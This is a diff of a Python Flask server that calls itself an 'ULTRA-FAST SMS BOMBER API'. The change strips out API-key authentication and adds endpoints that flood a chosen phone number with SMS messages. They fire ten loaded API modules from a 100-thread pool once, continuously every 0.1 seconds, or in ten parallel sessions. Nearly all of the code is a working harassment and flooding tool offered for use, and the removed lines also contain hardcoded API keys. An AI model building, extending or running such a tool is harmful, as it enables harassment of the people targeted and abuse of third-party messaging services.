@@ -1,8 +1,12 @@
 from flask import Flask, jsonify, request
 import threading
+import concurrent.futures
 import time
 import os
 import logging
+import asyncio
+import aiohttp
+import json
 
 app = Flask(__name__)
 
@@ -10,166 +14,222 @@ app = Flask(__name__)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ----------------- Security Configuration -----------------
-VALID_API_KEYS = {
-    "SMS-BOMBER-API-KEY-2024-VENOM-786": True,
-    "BACKUP-KEY-2024-SECURE-ACCESS": True
-}
-
-# ----------------- Security Middleware -----------------
-@app.before_request
-def authenticate():
-    client_ip = request.remote_addr
-    
-    # Check API Key (mandatory)
-    api_key = request.headers.get('X-API-Key')
-    if not api_key or api_key not in VALID_API_KEYS:
-        logger.warning(f"🔑 INVALID API KEY from {client_ip}")
-        return jsonify({"error": "Invalid API Key"}), 401
-    
-    logger.info(f"✅ Authenticated request from {client_ip}")
-
-# ----------------- Safe Import Helper -----------------
-def safe_import(module_name, func_name):
+# Load ALL API modules (apis1.py to apis10.py)
+ALL_APIS = []
+for i in range(1, 11):
     try:
-        mod = __import__(module_name)
-        return getattr(mod, func_name)
-    except Exception:
-        # fallback dummy function if module not found
-        def dummy(mobile_no):
-            logger.info(f"{func_name} skipped (module {module_name}.py not found)")
-        return dummy
+        module = __import__(f'apis{i}')
+        ALL_APIS.append(getattr(module, f'run_apis{i}'))
+        logger.info(f"✅  Loaded apis{i}.py")
+    except Exception as e:
+        logger.warning(f"❌  Failed to load apis{i}.py: {e}")
 
-# ----------------- Import All API Modules -----------------
-run_apis1 = safe_import("apis1", "run_apis1")
-run_apis2 = safe_import("apis2", "run_apis2")
-run_apis3 = safe_import("apis3", "run_apis3")
-run_apis4 = safe_import("apis4", "run_apis4")
-run_apis5 = safe_import("apis5", "run_apis5")
-run_apis6 = safe_import("apis6", "run_apis6")
-run_apis7 = safe_import("apis7", "run_apis7")
-run_apis8 = safe_import("apis8", "run_apis8")
-run_apis9 = safe_import("apis9", "run_apis9")
-run_apis10 = safe_import("apis10", "run_apis10")
+# Global thread pool for MAXIMUM parallelism
+THREAD_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=100)  # 100 concurrent threads!
+active_bombings = {}
 
-all_apis = [
-    run_apis1, run_apis2, run_apis3, run_apis4, run_apis5,
-    run_apis6, run_apis7, run_apis8, run_apis9, run_apis10
-]
-
-# ----------------- Request Validation -----------------
-def validate_mobile_number(mobile_no):
-    """Validate mobile number format"""
-    if not mobile_no or not isinstance(mobile_no, str):
-        return False
-    # Basic validation - 10 digits
-    return mobile_no.isdigit() and len(mobile_no) == 10
-
-# ----------------- Flask Routes -----------------
-@app.route('/num=<mobile_no>', methods=['GET'])
-def trigger_apis(mobile_no):
-    # Validate mobile number
-    if not validate_mobile_number(mobile_no):
-        return jsonify({
-            "error": "Invalid mobile number format. Must be 10 digits."
-        }), 400
+def bomb_phone_ultrafast(phone_number, attack_id):
+    """Bomb a phone number with ALL APIs in PARALLEL - NO DELAYS"""
+    logger.info(f"🚀 ULTRA-FAST BOMBING STARTED for {phone_number}")
     
-    client_ip = request.remote_addr
-    api_key = request.headers.get('X-API-Key', 'Unknown')
+    # Submit ALL APIs to thread pool simultaneously
+    futures = []
+    for api_func in ALL_APIS:
+        future = THREAD_POOL.submit(api_func, phone_number)
+        futures.append(future)
     
-    logger.info(f"🚀 Bombing started for {mobile_no} from {client_ip} (API Key: {api_key[:8]}...)")
-
-    # Run each API in separate thread
-    def run_api(api_func, number):
+    # Wait for ALL to complete (or timeout)
+    completed = 0
+    for future in concurrent.futures.as_completed(futures, timeout=5):
         try:
-            api_func(number)
-            logger.debug(f"API {api_func.__name__} executed successfully for {number}")
+            result = future.result()
+            completed += 1
         except Exception as e:
-            logger.error(f"Error in {api_func.__name__}: {e}")
+            logger.error(f"API failed: {e}")
+    
+    logger.info(f"✅  Bombing completed: {completed}/{len(ALL_APIS)} APIs executed")
+    
+    # Remove from active bombings
+    if attack_id in active_bombings:
+        del active_bombings[attack_id]
 
-    for api_func in all_apis:
-        threading.Thread(target=run_api, args=(api_func, mobile_no), daemon=True).start()
+def continuous_bombing(phone_number, attack_id, interval=0.1):
+    """Continuous bombing with specified interval (in seconds)"""
+    while attack_id in active_bombings:
+        bomb_phone_ultrafast(phone_number, attack_id)
+        time.sleep(interval)
 
+@app.route('/bomb/<phone_number>', methods=['GET'])
+def bomb_single(phone_number):
+    """Single ultra-fast bombing - ALL APIs in parallel"""
+    if not phone_number.isdigit() or len(phone_number) != 10:
+        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
+    
+    # Start bombing in background
+    attack_id = str(time.time())
+    threading.Thread(
+        target=bomb_phone_ultrafast,
+        args=(phone_number, attack_id),
+        daemon=True
+    ).start()
+    
     return jsonify({
-        "status": "Bombing Start",
-        "mobile": mobile_no,
-        "apis_triggered": len(all_apis),
-        "timestamp": time.time()
+        "status": "BOMBING_STARTED",
+        "phone": phone_number,
+        "apis": len(ALL_APIS),
+        "mode": "ULTRA_FAST_PARALLEL",
+        "message": "All APIs firing simultaneously!"
+    })
+
+@app.route('/bomb/continuous/<phone_number>', methods=['GET'])
+def bomb_continuous(phone_number):
+    """Continuous bombing - runs repeatedly"""
+    if not phone_number.isdigit() or len(phone_number) != 10:
+        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
+    
+    attack_id = str(time.time())
+    active_bombings[attack_id] = phone_number
+    
+    # Start continuous bombing
+    threading.Thread(
+        target=continuous_bombing,
+        args=(phone_number, attack_id, 0.1),  # 0.1 second interval = 10 times per second
+        daemon=True
+    ).start()
+    
+    return jsonify({
+        "status": "CONTINUOUS_BOMBING_STARTED",
+        "phone": phone_number,
+        "attack_id": attack_id,
+        "apis": len(ALL_APIS),
+        "interval": "0.1 seconds",
+        "message": "Continuous ultra-fast bombing activated!"
+    })
+
+@app.route('/bomb/stop/<attack_id>', methods=['GET'])
+def stop_bombing(attack_id):
+    """Stop continuous bombing"""
+    if attack_id in active_bombings:
+        phone = active_bombings[attack_id]
+        del active_bombings[attack_id]
+        return jsonify({
+            "status": "STOPPED",
+            "attack_id": attack_id,
+            "phone": phone,
+            "message": "Bombing stopped"
+        })
+    return jsonify({"error": "Attack ID not found"}), 404
+
+@app.route('/bomb/massive/<phone_number>', methods=['GET'])
+def bomb_massive(phone_number):
+    """MASSIVE parallel bombing - 10x simultaneous attacks"""
+    if not phone_number.isdigit() or len(phone_number) != 10:
+        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
+    
+    # Start 10 parallel bombing sessions
+    for i in range(10):
+        attack_id = f"{phone_number}_{time.time()}_{i}"
+        threading.Thread(
+            target=bomb_phone_ultrafast,
+            args=(phone_number, attack_id),
+            daemon=True
+        ).start()
+    
+    return jsonify({
+        "status": "MASSIVE_BOMBING_STARTED",
+        "phone": phone_number,
+        "parallel_attacks": 10,
+        "total_api_calls": len(ALL_APIS) * 10,
+        "message": "MASSIVE 10x parallel bombing initiated!"
     })
 
 @app.route('/status', methods=['GET'])
-def status():
-    """API status endpoint"""
-    active_apis = sum(1 for api in all_apis if not api.__name__.startswith('dummy'))
-    
+def get_status():
+    """Get bombing status"""
     return jsonify({
-        "status": "API is running",
-        "active_apis": active_apis,
-        "total_apis": len(all_apis),
-        "security": {
-            "api_key_auth": "ENABLED",
-            "ip_whitelisting": "DISABLED",
-            "rate_limiting": "DISABLED",
-            "unlimited_bombing": "ENABLED"
-        }
+        "status": "READY",
+        "apis_loaded": len(ALL_APIS),
+        "active_bombings": len(active_bombings),
+        "active_numbers": list(active_bombings.values()),
+        "thread_pool_size": THREAD_POOL._max_workers,
+        "server_time": time.time()
     })
 
-@app.route('/security')
-def security_info():
-    """Security configuration info"""
+@app.route('/test/<phone_number>', methods=['GET'])
+def test_single(phone_number):
+    """Test single API call for each API"""
+    if not phone_number.isdigit() or len(phone_number) != 10:
+        return jsonify({"error": "Invalid phone number. Must be 10 digits."}), 400
+    
+    results = []
+    for api_func in ALL_APIS:
+        try:
+            start = time.time()
+            api_func(phone_number)
+            elapsed = time.time() - start
+            results.append({
+                "api": api_func.__name__,
+                "status": "SUCCESS",
+                "time_ms": round(elapsed * 1000, 2)
+            })
+        except Exception as e:
+            results.append({
+                "api": api_func.__name__,
+                "status": "ERROR",
+                "error": str(e)[:100]
+            })
+    
     return jsonify({
-        "api_keys_configured": len(VALID_API_KEYS),
-        "security_level": "API_KEY_ONLY",
-        "protection": "API Key Authentication Only",
-        "rate_limiting": "DISABLED",
-        "ip_restrictions": "DISABLED"
+        "phone": phone_number,
+        "results": results,
+        "successful": sum(1 for r in results if r["status"] == "SUCCESS"),
+        "failed": sum(1 for r in results if r["status"] == "ERROR")
     })
 
 @app.route('/')
 def home():
+    """API Documentation"""
     return jsonify({
-        "message": "SMS Bombing API - SECURED",
-        "usage": "GET /num=<mobile_number> with X-API-Key header",
-        "security": "API Key Authentication Only - No IP Restrictions",
+        "name": "ULTRA-FAST SMS BOMBER API",
+        "developer": "venom",
+        "description": "MAXIMUM SPEED - ALL APIs in PARALLEL",
         "endpoints": {
-            "bombing": "/num=<mobile_number>",
-            "status": "/status",
-            "security_info": "/security"
+            "single_bomb": "GET /bomb/9876543210",
+            "continuous": "GET /bomb/continuous/9876543210",
+            "massive": "GET /bomb/massive/9876543210 (10x parallel)",
+            "stop": "GET /bomb/stop/{attack_id}",
+            "status": "GET /status",
+            "test": "GET /test/9876543210"
+        },
+        "features": [
+            "All APIs run in parallel",
+            "No delays between API calls",
+            "100 concurrent threads",
+            "Continuous bombing option",
+            "Massive 10x parallel attacks"
+        ],
+        "stats": {
+            "apis_loaded": len(ALL_APIS),
+            "max_concurrent": 100,
+            "estimated_speed": f"{len(ALL_APIS) * 10} API calls/second"
         }
     })
 
-# ----------------- Additional Security Headers -----------------
-@app.after_request
-def set_security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Server'] = 'Secure-Bombing-API'
-    return response
-
-# ----------------- Error Handlers -----------------
-@app.errorhandler(404)
-def not_found(error):
-    return jsonify({"error": "Endpoint not found"}), 404
-
-@app.errorhandler(500)
-def internal_error(error):
-    return jsonify({"error": "Internal server error"}), 500
-
-@app.errorhandler(401)
-def unauthorized(error):
-    return jsonify({"error": "Unauthorized - Invalid API key"}), 401
-
 if __name__ == '__main__':
-    print("=" * 60)
-    print("🛡️  SECURE SMS Bombing API Starting...")
-    print(f"🔑 API Keys: {len(VALID_API_KEYS)} configured")
-    print(f"🛡️  Security: API Key Authentication Only")
-    print(f"📈 Active APIs: {sum(1 for api in all_apis if not api.__name__.startswith('dummy'))}/{len(all_apis)}")
-    print("=" * 60)
-    print("🚀 READY: Anyone with API key can access this API!")
-    print("=" * 60)
+    print("=" * 70)
+    print("💣 ULTRA-FAST SMS BOMBER API")
+    print("=" * 70)
+    print(f"✅  Loaded {len(ALL_APIS)} API modules")
+    print(f"⚡  Thread Pool: 100 concurrent threads")
+    print("=" * 70)
+    print("🔥 ENDPOINTS:")
+    print("  /bomb/<number>          - Single ultra-fast attack")
+    print("  /bomb/continuous/<num>  - Continuous bombing (0.1s interval)")
+    print("  /bomb/massive/<num>     - MASSIVE 10x parallel attacks")
+    print("  /bomb/stop/<id>         - Stop continuous bombing")
+    print("  /status                 - Check server status")
+    print("  /test/<number>          - Test all APIs")
+    print("=" * 70)
     
-    # Get port from environment variable (for Railway/Render) or use default
-    port = int(os.environ.get('PORT', 7887))
+    port = 7863
     app.run(debug=False, host='0.0.0.0', port=port, threaded=True)
